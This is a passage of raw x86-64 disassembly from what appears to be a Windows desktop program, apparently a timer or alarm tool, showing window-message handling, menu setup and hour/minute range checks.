  402eae:	75 8d                	jne    0x402e3d
  402eb0:	ba 02 00 00 00       	mov    $0x2,%edx
  402eb5:	ff 15 bd b9 0d 00    	call   *0xdb9bd(%rip)        # 0x4de878
  402ebb:	b8 01 00 00 00       	mov    $0x1,%eax
  402ec0:	e9 78 ff ff ff       	jmp    0x402e3d
  402ec5:	45 31 c9             	xor    %r9d,%r9d
  402ec8:	45 31 c0             	xor    %r8d,%r8d
  402ecb:	48 8b 35 ce b9 0d 00 	mov    0xdb9ce(%rip),%rsi        # 0x4de8a0
  402ed2:	ba e9 03 00 00       	mov    $0x3e9,%edx
  402ed7:	ff d6                	call   *%rsi
  402ed9:	45 31 c9             	xor    %r9d,%r9d
  402edc:	45 31 c0             	xor    %r8d,%r8d
  402edf:	ba ea 03 00 00       	mov    $0x3ea,%edx
  402ee4:	48 89 d9             	mov    %rbx,%rcx
  402ee7:	89 c5                	mov    %eax,%ebp
  402ee9:	ff d6                	call   *%rsi
  402eeb:	89 c7                	mov    %eax,%edi
  402eed:	45 31 c9             	xor    %r9d,%r9d
  402ef0:	45 31 c0             	xor    %r8d,%r8d
  402ef3:	ba eb 03 00 00       	mov    $0x3eb,%edx
  402ef8:	48 89 d9             	mov    %rbx,%rcx
  402efb:	ff d6                	call   *%rsi
  402efd:	85 ff                	test   %edi,%edi
  402eff:	78 16                	js     0x402f17
  402f01:	83 fd 17             	cmp    $0x17,%ebp
  402f04:	77 11                	ja     0x402f17
  402f06:	85 c0                	test   %eax,%eax
  402f08:	78 0d                	js     0x402f17
  402f0a:	83 ff 3b             	cmp    $0x3b,%edi
  402f0d:	0f 1f 00             	nopl   (%rax)
  402f10:	7f 05                	jg     0x402f17
  402f12:	83 f8 3b             	cmp    $0x3b,%eax
  402f15:	7e 27                	jle    0x402f3e
  402f17:	41 b9 10 00 00 00    	mov    $0x10,%r9d
  402f1d:	4c 8d 05 fc 60 0d 00 	lea    0xd60fc(%rip),%r8        # 0x4d9020
  402f24:	48 8d 15 05 61 0d 00 	lea    0xd6105(%rip),%rdx        # 0x4d9030
  402f2b:	48 89 d9             	mov    %rbx,%rcx
  402f2e:	ff 15 ac b9 0d 00    	call   *0xdb9ac(%rip)        # 0x4de8e0
  402f34:	b8 01 00 00 00       	mov    $0x1,%eax
  402f39:	e9 ff fe ff ff       	jmp    0x402e3d
  402f3e:	41 89 c0             	mov    %eax,%r8d
  402f41:	89 fa                	mov    %edi,%edx
  402f43:	89 e9                	mov    %ebp,%ecx
  402f45:	e8 36 fe ff ff       	call   0x402d80
  402f4a:	41 b9 40 00 00 00    	mov    $0x40,%r9d
  402f50:	4c 8d 05 04 64 0d 00 	lea    0xd6404(%rip),%r8        # 0x4d935b
  402f57:	48 8d 15 02 64 0d 00 	lea    0xd6402(%rip),%rdx        # 0x4d9360
  402f5e:	48 89 d9             	mov    %rbx,%rcx
  402f61:	ff 15 79 b9 0d 00    	call   *0xdb979(%rip)        # 0x4de8e0
  402f67:	ba 01 00 00 00       	mov    $0x1,%edx
  402f6c:	48 89 d9             	mov    %rbx,%rcx
  402f6f:	ff 15 03 b9 0d 00    	call   *0xdb903(%rip)        # 0x4de878
  402f75:	b8 01 00 00 00       	mov    $0x1,%eax
  402f7a:	e9 be fe ff ff       	jmp    0x402e3d
  402f7f:	90                   	nop
  402f80:	56                   	push   %rsi
  402f81:	53                   	push   %rbx
  402f82:	48 81 ec a8 00 00 00 	sub    $0xa8,%rsp
  402f89:	8b 0d a1 90 0d 00    	mov    0xd90a1(%rip),%ecx        # 0x4dc030
  402f8f:	31 f6                	xor    %esi,%esi
  402f91:	48 8d 1d 74 a4 0d 00 	lea    0xda474(%rip),%rbx        # 0x4dd40c
  402f98:	85 c9                	test   %ecx,%ecx
  402f9a:	7f 18                	jg     0x402fb4
  402f9c:	e9 af 00 00 00       	jmp    0x403050
  402fa1:	83 c6 01             	add    $0x1,%esi
  402fa4:	48 83 c3 10          	add    $0x10,%rbx
  402fa8:	39 35 82 90 0d 00    	cmp    %esi,0xd9082(%rip)        # 0x4dc030
  402fae:	0f 8e 9c 00 00 00    	jle    0x403050
  402fb4:	8b 13                	mov    (%rbx),%edx
  402fb6:	85 d2                	test   %edx,%edx
  402fb8:	74 e7                	je     0x402fa1
  402fba:	8b 05 80 90 0d 00    	mov    0xd9080(%rip),%eax        # 0x4dc040
  402fc0:	39 43 f4             	cmp    %eax,-0xc(%rbx)
  402fc3:	75 dc                	jne    0x402fa1
  402fc5:	44 8b 0d 70 90 0d 00 	mov    0xd9070(%rip),%r9d        # 0x4dc03c
  402fcc:	44 39 4b f8          	cmp    %r9d,-0x8(%rbx)
  402fd0:	75 cf                	jne    0x402fa1
  402fd2:	44 8b 15 5f 90 0d 00 	mov    0xd905f(%rip),%r10d        # 0x4dc038
  402fd9:	44 39 53 fc          	cmp    %r10d,-0x4(%rbx)
  402fdd:	75 c2                	jne    0x402fa1
  402fdf:	41 b8 01 00 02 00    	mov    $0x20001,%r8d
  402fe5:	31 d2                	xor    %edx,%edx
  402fe7:	48 8d 0d 81 63 0d 00 	lea    0xd6381(%rip),%rcx        # 0x4d936f
  402fee:	4c 8b 0d 33 b9 0d 00 	mov    0xdb933(%rip),%r9        # 0x4de928
  402ff5:	41 ff d1             	call   *%r9
  402ff8:	8b 05 3a 90 0d 00    	mov    0xd903a(%rip),%eax        # 0x4dc038
  402ffe:	44 8b 0d 37 90 0d 00 	mov    0xd9037(%rip),%r9d        # 0x4dc03c
  403005:	48 8d 15 6d 63 0d 00 	lea    0xd636d(%rip),%rdx        # 0x4d9379
  40300c:	44 8b 05 2d 90 0d 00 	mov    0xd902d(%rip),%r8d        # 0x4dc040
  403013:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
  403018:	89 44 24 20          	mov    %eax,0x20(%rsp)
  40301c:	e8 c7 6f 00 00       	call   0x409fe8
  403021:	41 b9 40 00 00 00    	mov    $0x40,%r9d
  403027:	4c 8d 05 67 63 0d 00 	lea    0xd6367(%rip),%r8        # 0x4d9395
  40302e:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
  403033:	48 8b 0d 66 a4 0d 00 	mov    0xda466(%rip),%rcx        # 0x4dd4a0
  40303a:	4c 8b 15 9f b8 0d 00 	mov    0xdb89f(%rip),%r10        # 0x4de8e0
  403041:	41 ff d2             	call   *%r10
  403044:	c7 03 00 00 00 00    	movl   $0x0,(%rbx)
  40304a:	e9 52 ff ff ff       	jmp    0x402fa1
  40304f:	90                   	nop
  403050:	48 81 c4 a8 00 00 00 	add    $0xa8,%rsp
  403057:	5b                   	pop    %rbx
  403058:	5e                   	pop    %rsi
  403059:	c3                   	ret
  40305a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  403060:	41 56                	push   %r14
  403062:	41 55                	push   %r13
  403064:	41 54                	push   %r12
  403066:	55                   	push   %rbp
  403067:	57                   	push   %rdi
  403068:	56                   	push   %rsi
  403069:	53                   	push   %rbx
  40306a:	48 81 ec c0 04 00 00 	sub    $0x4c0,%rsp
  403071:	83 fa 0f             	cmp    $0xf,%edx
  403074:	48 89 cb             	mov    %rcx,%rbx
  403077:	0f 84 e3 00 00 00    	je     0x403160
  40307d:	76 36                	jbe    0x4030b5
  40307f:	81 fa 11 01 00 00    	cmp    $0x111,%edx
  403085:	74 79                	je     0x403100
  403087:	81 fa 13 01 00 00    	cmp    $0x113,%edx
  40308d:	74 54                	je     0x4030e3
  40308f:	48 89 d9             	mov    %rbx,%rcx
  403092:	ff 15 c8 b7 0d 00    	call   *0xdb7c8(%rip)        # 0x4de860
  403098:	48 89 c6             	mov    %rax,%rsi
  40309b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4030a0:	48 89 f0             	mov    %rsi,%rax
  4030a3:	48 81 c4 c0 04 00 00 	add    $0x4c0,%rsp
  4030aa:	5b                   	pop    %rbx
  4030ab:	5e                   	pop    %rsi
  4030ac:	5f                   	pop    %rdi
  4030ad:	5d                   	pop    %rbp
  4030ae:	41 5c                	pop    %r12
  4030b0:	41 5d                	pop    %r13
  4030b2:	41 5e                	pop    %r14
  4030b4:	c3                   	ret
  4030b5:	83 fa 01             	cmp    $0x1,%edx
  4030b8:	74 69                	je     0x403123
  4030ba:	83 fa 02             	cmp    $0x2,%edx
  4030bd:	75 d0                	jne    0x40308f
  4030bf:	ba 01 00 00 00       	mov    $0x1,%edx
  4030c4:	48 8b 35 fd b7 0d 00 	mov    0xdb7fd(%rip),%rsi        # 0x4de8c8
  4030cb:	ff d6                	call   *%rsi
  4030cd:	ba 02 00 00 00       	mov    $0x2,%edx
  4030d2:	48 89 d9             	mov    %rbx,%rcx
  4030d5:	ff d6                	call   *%rsi
  4030d7:	31 c9                	xor    %ecx,%ecx
  4030d9:	31 f6                	xor    %esi,%esi
  4030db:	ff 15 07 b8 0d 00    	call   *0xdb807(%rip)        # 0x4de8e8
  4030e1:	eb bd                	jmp    0x4030a0
  4030e3:	31 f6                	xor    %esi,%esi
  4030e5:	49 83 f8 01          	cmp    $0x1,%r8
  4030e9:	0f 84 21 03 00 00    	je     0x403410
  4030ef:	49 83 f8 02          	cmp    $0x2,%r8
  4030f3:	75 ab                	jne    0x4030a0
  4030f5:	e8 86 fe ff ff       	call   0x402f80
  4030fa:	eb a4                	jmp    0x4030a0
  4030fc:	0f 1f 40 00          	nopl   0x0(%rax)
  403100:	66 41 81 c0 bf 63    	add    $0x63bf,%r8w
  403106:	31 f6                	xor    %esi,%esi
  403108:	66 41 83 f8 05       	cmp    $0x5,%r8w
  40310d:	77 91                	ja     0x4030a0
  40310f:	48 8d 05 ce 62 0d 00 	lea    0xd62ce(%rip),%rax        # 0x4d93e4
  403116:	45 0f b7 c0          	movzwl %r8w,%r8d
  40311a:	4a 63 14 80          	movslq (%rax,%r8,4),%rdx
  40311e:	48 01 d0             	add    %rdx,%rax
  403121:	ff e0                	jmp    *%rax
  403123:	48 8b 35 d6 b7 0d 00 	mov    0xdb7d6(%rip),%rsi        # 0x4de900
  40312a:	45 31 c9             	xor    %r9d,%r9d
  40312d:	41 b8 e8 03 00 00    	mov    $0x3e8,%r8d
  403133:	ba 01 00 00 00       	mov    $0x1,%edx
  403138:	ff d6                	call   *%rsi
  40313a:	45 31 c9             	xor    %r9d,%r9d
  40313d:	41 b8 e8 03 00 00    	mov    $0x3e8,%r8d
  403143:	ba 02 00 00 00       	mov    $0x2,%edx
  403148:	48 89 d9             	mov    %rbx,%rcx
  40314b:	ff d6                	call   *%rsi
  40314d:	c7 05 dd 8e 0d 00 01 	movl   $0x1,0xd8edd(%rip)        # 0x4dc034
  403154:	00 00 00 
  403157:	31 f6                	xor    %esi,%esi
  403159:	e9 42 ff ff ff       	jmp    0x4030a0
  40315e:	66 90                	xchg   %ax,%ax
  403160:	48 8d 94 24 c0 00 00 	lea    0xc0(%rsp),%rdx
  403167:	00 
  403168:	ff 15 da b6 0d 00    	call   *0xdb6da(%rip)        # 0x4de848
  40316e:	48 89 c7             	mov    %rax,%rdi
  403171:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
  403176:	48 89 d9             	mov    %rbx,%rcx
  403179:	ff 15 19 b7 0d 00    	call   *0xdb719(%rip)        # 0x4de898
  40317f:	48 89 f9             	mov    %rdi,%rcx
  403182:	ff 15 60 b3 0d 00    	call   *0xdb360(%rip)        # 0x4de4e8
  403188:	48 89 c6             	mov    %rax,%rsi
  40318b:	44 8b 44 24 5c       	mov    0x5c(%rsp),%r8d
  403190:	8b 54 24 58          	mov    0x58(%rsp),%edx
  403194:	48 89 f9             	mov    %rdi,%rcx
  403197:	ff 15 43 b3 0d 00    	call   *0xdb343(%rip)        # 0x4de4e0
  40319d:	48 89 f1             	mov    %rsi,%rcx
  4031a0:	48 89 c2             	mov    %rax,%rdx
  4031a3:	49 89 c4             	mov    %rax,%r12
  4031a6:	4c 8b 2d 93 b3 0d 00 	mov    0xdb393(%rip),%r13        # 0x4de540
  4031ad:	41 ff d5             	call   *%r13
  4031b0:	b9 ff ff ff 00       	mov    $0xffffff,%ecx
  4031b5:	49 89 c6             	mov    %rax,%r14
  4031b8:	ff 15 42 b3 0d 00    	call   *0xdb342(%rip)        # 0x4de500
  4031be:	48 89 c5             	mov    %rax,%rbp
  4031c1:	49 89 c0             	mov    %rax,%r8
  4031c4:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
  4031c9:	48 89 f1             	mov    %rsi,%rcx
  4031cc:	ff 15 be b6 0d 00    	call   *0xdb6be(%rip)        # 0x4de890
  4031d2:	48 89 e9             	mov    %rbp,%rcx
  4031d5:	48 8b 2d 34 b3 0d 00 	mov    0xdb334(%rip),%rbp        # 0x4de510
  4031dc:	ff d5                	call   *%rbp
  4031de:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
  4031e3:	48 89 f1             	mov    %rsi,%rcx
  4031e6:	e8 a5 f9 ff ff       	call   0x402b90
  4031eb:	8b 44 24 5c          	mov    0x5c(%rsp),%eax
  4031ef:	44 8b 4c 24 58       	mov    0x58(%rsp),%r9d
  4031f4:	45 31 c0             	xor    %r8d,%r8d
  4031f7:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
  4031fc:	31 d2                	xor    %edx,%edx
  4031fe:	48 89 f9             	mov    %rdi,%rcx
  403201:	c7 44 24 40 20 00 cc 	movl   $0xcc0020,0x40(%rsp)
  403208:	00 
  403209:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
  403210:	00 
  403211:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
  403218:	00 
  403219:	89 44 24 20          	mov    %eax,0x20(%rsp)
  40321d:	ff 15 b5 b2 0d 00    	call   *0xdb2b5(%rip)        # 0x4de4d8
  403223:	4c 89 f2             	mov    %r14,%rdx
  403226:	48 89 f1             	mov    %rsi,%rcx
  403229:	41 ff d5             	call   *%r13
  40322c:	4c 89 e1             	mov    %r12,%rcx
  40322f:	ff d5                	call   *%rbp
  403231:	48 89 f1             	mov    %rsi,%rcx
  403234:	31 f6                	xor    %esi,%esi
  403236:	ff 15 cc b2 0d 00    	call   *0xdb2cc(%rip)        # 0x4de508
  40323c:	48 8d 94 24 c0 00 00 	lea    0xc0(%rsp),%rdx
  403243:	00 
  403244:	48 89 d9             	mov    %rbx,%rcx
  403247:	ff 15 33 b6 0d 00    	call   *0xdb633(%rip)        # 0x4de880
  40324d:	e9 4e fe ff ff       	jmp    0x4030a0
  403252:	31 c0                	xor    %eax,%eax
  403254:	83 3d d5 8d 0d 00 00 	cmpl   $0x0,0xd8dd5(%rip)        # 0x4dc030
  40325b:	48 8d bc 24 d8 00 00 	lea    0xd8(%rsp),%rdi
  403262:	00 
  403263:	49 ba b5 b1 c7 b0 c9 	movabs $0xc3d6e8c9b0c7b1b5,%r10
  40326a:	e8 d6 c3 
  40326d:	49 bb b5 c4 c4 d6 d6 	movabs $0xa3ad3d6d6c4c4b5,%r11
  403274:	d3 3a 0a 
  403277:	b9 7d 00 00 00       	mov    $0x7d,%ecx
  40327c:	4c 89 94 24 c0 00 00 	mov    %r10,0xc0(%rsp)
  403283:	00 
  403284:	4c 89 9c 24 c8 00 00 	mov    %r11,0xc8(%rsp)
  40328b:	00 
  40328c:	48 c7 84 24 d0 00 00 	movq   $0xa,0xd0(%rsp)
  403293:	00 0a 00 00 00 
  403298:	f3 48 ab             	rep stos %rax,(%rdi)
  40329b:	0f 84 95 01 00 00    	je     0x403436
  4032a1:	0f 8e e9 01 00 00    	jle    0x403490
  4032a7:	48 8d 35 5e a1 0d 00 	lea    0xda15e(%rip),%rsi        # 0x4dd40c
  4032ae:	48 8d ac 24 c0 00 00 	lea    0xc0(%rsp),%rbp
  4032b5:	00 
  4032b6:	4c 8d 2d e8 60 0d 00 	lea    0xd60e8(%rip),%r13        # 0x4d93a5
  4032bd:	4c 8d 25 da 60 0d 00 	lea    0xd60da(%rip),%r12        # 0x4d939e
  4032c4:	31 ff                	xor    %edi,%edi
  4032c6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4032cd:	00 00 00 
  4032d0:	44 8b 06             	mov    (%rsi),%r8d
  4032d3:	4c 89 e0             	mov    %r12,%rax
  4032d6:	48 8d 15 e5 60 0d 00 	lea    0xd60e5(%rip),%rdx        # 0x4d93c2
  4032dd:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
  4032e2:	45 85 c0             	test   %r8d,%r8d
  4032e5:	49 0f 44 c5          	cmove  %r13,%rax
  4032e9:	83 c7 01             	add    $0x1,%edi
  4032ec:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  4032f1:	8b 46 fc             	mov    -0x4(%rsi),%eax
  4032f4:	41 89 f8             	mov    %edi,%r8d
  4032f7:	89 44 24 28          	mov    %eax,0x28(%rsp)
  4032fb:	8b 46 f8             	mov    -0x8(%rsi),%eax
  4032fe:	89 44 24 20          	mov    %eax,0x20(%rsp)
  403302:	44 8b 4e f4          	mov    -0xc(%rsi),%r9d
  403306:	48 83 c6 10          	add    $0x10,%rsi
  40330a:	e8 d9 6c 00 00       	call   0x409fe8
  40330f:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
  403314:	48 89 e9             	mov    %rbp,%rcx
  403317:	e8 f4 6c 00 00       	call   0x40a010
  40331c:	39 3d 0e 8d 0d 00    	cmp    %edi,0xd8d0e(%rip)        # 0x4dc030
  403322:	7f ac                	jg     0x4032d0
  403324:	41 b9 40 00 00 00    	mov    $0x40,%r9d
  40332a:	4c 8d 05 a8 60 0d 00 	lea    0xd60a8(%rip),%r8        # 0x4d93d9
  403331:	48 89 ea             	mov    %rbp,%rdx
  403334:	48 89 d9             	mov    %rbx,%rcx
  403337:	31 f6                	xor    %esi,%esi
  403339:	ff 15 a1 b5 0d 00    	call   *0xdb5a1(%rip)        # 0x4de8e0
  40333f:	e9 5c fd ff ff       	jmp    0x4030a0
  403344:	49 89 c8             	mov    %rcx,%r8
  403347:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  40334e:	00 00 
  403350:	4c 8d 0d c9 fa ff ff 	lea    -0x537(%rip),%r9        # 0x402e20
  403357:	ba 66 00 00 00       	mov    $0x66,%edx
  40335c:	48 8b 0d 7d a0 0d 00 	mov    0xda07d(%rip),%rcx        # 0x4dd3e0
  403363:	31 f6                	xor    %esi,%esi
  403365:	ff 15 fd b4 0d 00    	call   *0xdb4fd(%rip)        # 0x4de868
  40336b:	e9 30 fd ff ff       	jmp    0x4030a0
  403370:	49 89 c8             	mov    %rcx,%r8
  403373:	4c 8d 0d d6 e1 ff ff 	lea    -0x1e2a(%rip),%r9        # 0x401550
  40337a:	ba 65 00 00 00       	mov    $0x65,%edx
  40337f:	48 8b 0d 5a a0 0d 00 	mov    0xda05a(%rip),%rcx        # 0x4dd3e0
  403386:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  40338d:	00 00 
  40338f:	31 f6                	xor    %esi,%esi
  403391:	ff 15 d1 b4 0d 00    	call   *0xdb4d1(%rip)        # 0x4de868
  403397:	45 31 c0             	xor    %r8d,%r8d
  40339a:	31 d2                	xor    %edx,%edx
  40339c:	48 89 d9             	mov    %rbx,%rcx
  40339f:	ff 15 1b b5 0d 00    	call   *0xdb51b(%rip)        # 0x4de8c0
  4033a5:	e9 f6 fc ff ff       	jmp    0x4030a0
  4033aa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4033b0:	c7 05 7a 8c 0d 00 00 	movl   $0x0,0xd8c7a(%rip)        # 0x4dc034
  4033b7:	00 00 00 
  4033ba:	41 b9 40 00 00 00    	mov    $0x40,%r9d
  4033c0:	4c 8d 05 94 5f 0d 00 	lea    0xd5f94(%rip),%r8        # 0x4d935b
  4033c7:	48 8d 15 e9 5f 0d 00 	lea    0xd5fe9(%rip),%rdx        # 0x4d93b7
  4033ce:	31 f6                	xor    %esi,%esi
  4033d0:	ff 15 0a b5 0d 00    	call   *0xdb50a(%rip)        # 0x4de8e0
  4033d6:	e9 c5 fc ff ff       	jmp    0x4030a0
  4033db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4033e0:	c7 05 4a 8c 0d 00 01 	movl   $0x1,0xd8c4a(%rip)        # 0x4dc034
  4033e7:	00 00 00 
  4033ea:	41 b9 40 00 00 00    	mov    $0x40,%r9d
  4033f0:	4c 8d 05 64 5f 0d 00 	lea    0xd5f64(%rip),%r8        # 0x4d935b
  4033f7:	48 8d 15 ae 5f 0d 00 	lea    0xd5fae(%rip),%rdx        # 0x4d93ac
  4033fe:	31 f6                	xor    %esi,%esi
  403400:	ff 15 da b4 0d 00    	call   *0xdb4da(%rip)        # 0x4de8e0
  403406:	e9 95 fc ff ff       	jmp    0x4030a0
  40340b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  403410:	8b 3d 1e 8c 0d 00    	mov    0xd8c1e(%rip),%edi        # 0x4dc034
  403416:	85 ff                	test   %edi,%edi
  403418:	0f 84 82 fc ff ff    	je     0x4030a0
  40341e:	e8 bd f7 ff ff       	call   0x402be0
  403423:	45 31 c0             	xor    %r8d,%r8d
  403426:	31 d2                	xor    %edx,%edx
  403428:	48 89 d9             	mov    %rbx,%rcx
  40342b:	ff 15 8f b4 0d 00    	call   *0xdb48f(%rip)        # 0x4de8c0
  403431:	e9 6a fc ff ff       	jmp    0x4030a0
  403436:	48 8d ac 24 c0 00 00 	lea    0xc0(%rsp),%rbp
  40343d:	00 
  40343e:	48 89 ea             	mov    %rbp,%rdx
  403441:	8b 0a                	mov    (%rdx),%ecx
  403443:	48 83 c2 04          	add    $0x4,%rdx
  403447:	8d 81 ff fe fe fe    	lea    -0x1010101(%rcx),%eax
  40344d:	f7 d1                	not    %ecx
  40344f:	21 c8                	and    %ecx,%eax
  403451:	25 80 80 80 80       	and    $0x80808080,%eax
  403456:	74 e9                	je     0x403441
  403458:	89 c1                	mov    %eax,%ecx
  40345a:	49 b9 c3 bb d3 d0 c9 	movabs $0xc3d6e8c9d0d3bbc3,%r9
  403461:	e8 d6 c3 
  403464:	c1 e9 10             	shr    $0x10,%ecx
  403467:	a9 80 80 00 00       	test   $0x8080,%eax
  40346c:	0f 44 c1             	cmove  %ecx,%eax
  40346f:	48 8d 4a 02          	lea    0x2(%rdx),%rcx
  403473:	48 0f 44 d1          	cmove  %rcx,%rdx
  403477:	00 c0                	add    %al,%al
  403479:	48 83 da 03          	sbb    $0x3,%rdx
  40347d:	4c 89 0a             	mov    %r9,(%rdx)
  403480:	c7 42 08 c4 d6 d6 d3 	movl   $0xd3d6d6c4,0x8(%rdx)
  403487:	c6 42 0c 00          	movb   $0x0,0xc(%rdx)
  40348b:	e9 94 fe ff ff       	jmp    0x403324
  403490:	48 8d ac 24 c0 00 00 	lea    0xc0(%rsp),%rbp
  403497:	00 
  403498:	e9 87 fe ff ff       	jmp    0x403324
  40349d:	0f 1f 00             	nopl   (%rax)
  4034a0:	41 57                	push   %r15
  4034a2:	41 56                	push   %r14
  4034a4:	41 55                	push   %r13
  4034a6:	41 54                	push   %r12
  4034a8:	55                   	push   %rbp
  4034a9:	57                   	push   %rdi
  4034aa:	56                   	push   %rsi
  4034ab:	53                   	push   %rbx
  4034ac:	48 81 ec 68 04 00 00 	sub    $0x468,%rsp
  4034b3:	48 89 cd             	mov    %rcx,%rbp
  4034b6:	45 89 cd             	mov    %r9d,%r13d
  4034b9:	e8 82 e7 ff ff       	call   0x401c40
  4034be:	85 c0                	test   %eax,%eax
  4034c0:	0f 85 9a 02 00 00    	jne    0x403760
  4034c6:	45 31 e4             	xor    %r12d,%r12d
  4034c9:	48 8d bc 24 70 01 00 	lea    0x170(%rsp),%rdi
  4034d0:	00 
  4034d1:	b9 09 00 00 00       	mov    $0x9,%ecx
  4034d6:	4c 89 e0             	mov    %r12,%rax
  4034d9:	ba 00 7f 00 00       	mov    $0x7f00,%edx
  4034de:	48 89 2d fb 9e 0d 00 	mov    %rbp,0xd9efb(%rip)        # 0x4dd3e0
  4034e5:	f3 48 ab             	rep stos %rax,(%rdi)
  4034e8:	48 8d 05 71 fb ff ff 	lea    -0x48f(%rip),%rax        # 0x403060
  4034ef:	48 89 ac 24 88 01 00 	mov    %rbp,0x188(%rsp)
  4034f6:	00 
  4034f7:	48 c7 84 24 a0 01 00 	movq   $0x6,0x1a0(%rsp)
  4034fe:	00 06 00 00 00 
  403503:	48 89 84 24 78 01 00 	mov    %rax,0x178(%rsp)
  40350a:	00 
  40350b:	48 8d 05 ea 5e 0d 00 	lea    0xd5eea(%rip),%rax        # 0x4d93fc
  403512:	48 89 84 24 b0 01 00 	mov    %rax,0x1b0(%rsp)
  403519:	00 
  40351a:	ff 15 b0 b3 0d 00    	call   *0xdb3b0(%rip)        # 0x4de8d0
  403520:	31 c9                	xor    %ecx,%ecx
  403522:	ba 00 7f 00 00       	mov    $0x7f00,%edx
  403527:	48 89 84 24 98 01 00 	mov    %rax,0x198(%rsp)
  40352e:	00 
  40352f:	ff 15 a3 b3 0d 00    	call   *0xdb3a3(%rip)        # 0x4de8d8
  403535:	48 8d 8c 24 70 01 00 	lea    0x170(%rsp),%rcx
  40353c:	00 
  40353d:	48 89 84 24 90 01 00 	mov    %rax,0x190(%rsp)
  403544:	00 
  403545:	ff 15 a5 b3 0d 00    	call   *0xdb3a5(%rip)        # 0x4de8f0
  40354b:	66 85 c0             	test   %ax,%ax
  40354e:	0f 84 c1 06 00 00    	je     0x403c15
  403554:	48 8b 1d f5 b2 0d 00 	mov    0xdb2f5(%rip),%rbx        # 0x4de850
  40355b:	ff d3                	call   *%rbx
  40355d:	48 89 c7             	mov    %rax,%rdi
  403560:	ff d3                	call   *%rbx
  403562:	48 89 c6             	mov    %rax,%rsi
  403565:	48 8b 1d d4 b2 0d 00 	mov    0xdb2d4(%rip),%rbx        # 0x4de840
  40356c:	31 d2                	xor    %edx,%edx
  40356e:	4c 8d 0d a6 5e 0d 00 	lea    0xd5ea6(%rip),%r9        # 0x4d941b
  403575:	41 b8 41 9c 00 00    	mov    $0x9c41,%r8d
  40357b:	48 89 c1             	mov    %rax,%rcx
  40357e:	ff d3                	call   *%rbx
  403580:	31 d2                	xor    %edx,%edx
  403582:	4c 8d 0d 9f 5e 0d 00 	lea    0xd5e9f(%rip),%r9        # 0x4d9428
  403589:	41 b8 42 9c 00 00    	mov    $0x9c42,%r8d
  40358f:	48 89 f1             	mov    %rsi,%rcx
  403592:	ff d3                	call   *%rbx
  403594:	45 31 c9             	xor    %r9d,%r9d
  403597:	45 31 c0             	xor    %r8d,%r8d
  40359a:	ba 00 08 00 00       	mov    $0x800,%edx
  40359f:	48 89 f1             	mov    %rsi,%rcx
  4035a2:	ff d3                	call   *%rbx
  4035a4:	31 d2                	xor    %edx,%edx
  4035a6:	4c 8d 0d 88 5e 0d 00 	lea    0xd5e88(%rip),%r9        # 0x4d9435
  4035ad:	41 b8 43 9c 00 00    	mov    $0x9c43,%r8d
  4035b3:	48 89 f1             	mov    %rsi,%rcx
  4035b6:	ff d3                	call   *%rbx
  4035b8:	31 d2                	xor    %edx,%edx
  4035ba:	4c 8d 0d 81 5e 0d 00 	lea    0xd5e81(%rip),%r9        # 0x4d9442
  4035c1:	41 b8 44 9c 00 00    	mov    $0x9c44,%r8d
  4035c7:	48 89 f1             	mov    %rsi,%rcx
  4035ca:	ff d3                	call   *%rbx
  4035cc:	31 d2                	xor    %edx,%edx
  4035ce:	4c 8d 0d 7a 5e 0d 00 	lea    0xd5e7a(%rip),%r9        # 0x4d944f
  4035d5:	41 b8 45 9c 00 00    	mov    $0x9c45,%r8d
  4035db:	48 89 f1             	mov    %rsi,%rcx
  4035de:	ff d3                	call   *%rbx
  4035e0:	45 31 c9             	xor    %r9d,%r9d
  4035e3:	45 31 c0             	xor    %r8d,%r8d
  4035e6:	ba 00 08 00 00       	mov    $0x800,%edx
  4035eb:	48 89 f1             	mov    %rsi,%rcx
  4035ee:	ff d3                	call   *%rbx
  4035f0:	31 d2                	xor    %edx,%edx
  4035f2:	4c 8d 0d 63 5e 0d 00 	lea    0xd5e63(%rip),%r9        # 0x4d945c
  4035f9:	41 b8 46 9c 00 00    	mov    $0x9c46,%r8d
  4035ff:	48 89 f1             	mov    %rsi,%rcx
  403602:	ff d3                	call   *%rbx
  403604:	4c 8d 0d 5a 5e 0d 00 	lea    0xd5e5a(%rip),%r9        # 0x4d9465
  40360b:	49 89 f0             	mov    %rsi,%r8
  40360e:	ba 10 00 00 00       	mov    $0x10,%edx
  403613:	48 89 f9             	mov    %rdi,%rcx
  403616:	ff d3                	call   *%rbx
  403618:	31 c9                	xor    %ecx,%ecx
  40361a:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
  403621:	00 00 
  403623:	48 89 6c 24 50       	mov    %rbp,0x50(%rsp)
  403628:	48 89 7c 24 48       	mov    %rdi,0x48(%rsp)
  40362d:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
  403634:	00 00 
  403636:	41 b9 00 00 cf 00    	mov    $0xcf0000,%r9d
  40363c:	c7 44 24 38 bc 02 00 	movl   $0x2bc,0x38(%rsp)
  403643:	00 
  403644:	c7 44 24 30 84 03 00 	movl   $0x384,0x30(%rsp)
  40364b:	00 
  40364c:	4c 8d 05 1b 5e 0d 00 	lea    0xd5e1b(%rip),%r8        # 0x4d946e
  403653:	c7 44 24 28 00 00 00 	movl   $0x80000000,0x28(%rsp)
  40365a:	80 
  40365b:	c7 44 24 20 00 00 00 	movl   $0x80000000,0x20(%rsp)
  403662:	80 
  403663:	48 8d 15 92 5d 0d 00 	lea    0xd5d92(%rip),%rdx        # 0x4d93fc
